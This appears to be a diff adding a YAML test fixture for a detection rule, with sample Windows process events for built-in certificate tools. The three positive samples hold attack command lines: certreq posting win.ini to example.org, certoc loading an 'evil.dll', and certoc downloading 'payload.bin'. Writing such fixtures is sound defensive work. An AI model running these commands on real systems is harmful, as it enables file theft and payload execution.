@@ -1,0 +1,48 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: certreq.exe
+      executable: 'C:\Windows\System32\certreq.exe'
+      command_line: 'certreq.exe -Post -config https://example.org/ c:\windows\win.ini output.txt'
+- id: pos2
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: certoc.exe
+      executable: 'C:\Windows\System32\certoc.exe'
+      command_line: 'certoc.exe -LoadDLL C:\Users\Public\evil.dll'
+- id: pos3
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: certoc.exe
+      executable: 'C:\Windows\System32\certoc.exe'
+      command_line: 'certoc.exe -GetCACAPS https://example.org/payload.bin'
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: certreq.exe
+      executable: 'C:\Windows\System32\certreq.exe'
+      command_line: 'certreq.exe -new request.inf request.req'
